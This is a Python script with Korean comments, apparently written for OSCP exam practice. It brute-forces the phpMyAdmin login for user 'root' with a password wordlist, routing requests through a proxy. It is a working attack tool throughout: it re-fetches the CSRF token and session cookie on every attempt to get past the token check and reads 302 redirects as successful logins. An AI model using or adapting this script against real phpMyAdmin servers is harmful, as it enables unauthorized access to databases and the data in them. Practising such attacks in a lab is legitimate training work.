#!/usr/bin/env python3
"""
phpMyAdmin 브루트포스 (OSCP 연습용)

phpMyAdmin은 로그인 시 세션+CSRF 토큰 검증을 하므로 Hydra처럼 정적 토큰을 쓰면
전부 거부된다. 그래서 매 시도마다 GET으로 토큰을 새로 받아 POST하는 구조.
"""

import re
import sys
from pathlib import Path

import requests

TARGET_URL = "http://127.0.0.1:8080/phpmyadmin/index.php"

# Hydra의 HYDRA_PROXY는 http:// 스킴을 지원하지 않아 requests에서 직접 지정
PROXIES = {
    "http": "http://192.168.199.189:3128",
    "https": "http://192.168.199.189:3128",
}

USERNAME = "root"

WORDLIST = Path(
    "/usr/share/wordlists/seclists/Passwords/Most-Popular-Letter-Passes.txt"
)

TIMEOUT = 10

# 로그인 실패 시 응답 본문에 포함되는 문구 (성공/실패 판별 기준)
FAIL_KEYWORD = "Access denied"


def extract_token(html: str) -> str | None:
    """로그인 페이지 HTML에서 CSRF 토큰 값을 뽑아낸다."""
    match = re.search(r'name="token"\s+value="([^"]+)"', html)
    if match:
        return match.group(1)

    # 일부 버전은 속성 순서/따옴표 스타일이 달라서 두 번째 패턴도 시도
    match = re.search(r'token["\']?\s*[:=]\s*["\']([^"\']+)["\']', html)
    if match:
        return match.group(1)

    return None


def login_attempt(session: requests.Session, password: str) -> tuple[bool, str]:
    """
    비밀번호 하나로 로그인을 한 번 시도한다.

    토큰이 매 페이지 로드마다 바뀌므로 반드시 GET -> 토큰 추출 -> POST 순서.
    세션 쿠키(PHPSESSID)는 session 객체가 알아서 유지·전송한다.
    """
    # 새 토큰과 세션 쿠키를 받기 위한 GET
    try:
        resp_get = session.get(TARGET_URL, proxies=PROXIES, timeout=TIMEOUT)
    except requests.exceptions.RequestException as e:
        return False, f"GET 요청 실패: {e}"

    if resp_get.status_code != 200:
        return False, f"로그인 페이지 로드 실패 (HTTP {resp_get.status_code})"

    token = extract_token(resp_get.text)
    if not token:
        return False, "토큰 추출 실패 (폼 구조 변경 가능성)"

    data = {
        "pma_username": USERNAME,
        "pma_password": password,
        "server": "2",  # MariaDB 서버 선택
        "target": "index.php",
        "token": token,
        "lang": "en",
    }

    # 리다이렉트를 따르지 않는 이유: 성공 시 내려오는 302 자체가 성공 신호라서
    try:
        resp_post = session.post(
            TARGET_URL,
            data=data,
            proxies=PROXIES,
            timeout=TIMEOUT,
            allow_redirects=False,
        )
    except requests.exceptions.RequestException as e:
        return False, f"POST 요청 실패: {e}"

    # 판별: 302 = 성공, 본문에 FAIL_KEYWORD 있음 = 실패
    if resp_post.status_code == 302:
        return True, "성공 추정 (HTTP 302 Redirect)"

    if FAIL_KEYWORD not in resp_post.text:
        # 200인데 실패 문구가 없으면 다른 페이지에 도달한 것 -> 성공 가능성
        return True, f"성공 추정 (HTTP {resp_post.status_code}, '{FAIL_KEYWORD}' 미발견)"

    return False, f"실패 (HTTP {resp_post.status_code}, '{FAIL_KEYWORD}' 발견)"


def main():
    if not WORDLIST.is_file():
        print(f"[!] 워드리스트를 찾을 수 없습니다: {WORDLIST}")
        sys.exit(1)

    # Session을 쓰는 이유: PHPSESSID 쿠키를 유지해야 토큰 검증이 통과함
    session = requests.Session()
    session.headers.update(
        {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"}
    )

    with open(WORDLIST, "r", encoding="utf-8", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]

    print(f"[+] 대상 URL: {TARGET_URL}")
    print(f"[+] 프록시: {PROXIES['http']}")
    print(f"[+] 사용자명: {USERNAME}")
    print(f"[+] 비밀번호 개수: {len(passwords)}")
    print("-" * 60)

    for idx, password in enumerate(passwords, 1):
        success, message = login_attempt(session, password)
        status = "[+]" if success else "[-]"
        print(f"{status} [{idx}/{len(passwords)}] '{password}' -> {message}")

        if success:
            print("-" * 60)
            print(f"[!] 후보 비밀번호 발견: {password}")
            print("[!] 브라우저나 curl로 수동 로그인하여 최종 확인하십시오.")
            break
    else:
        print("-" * 60)
        print("[!] 모든 비밀번호 시도 완료. 일치하는 비밀번호 없음.")


if __name__ == "__main__":
    main()
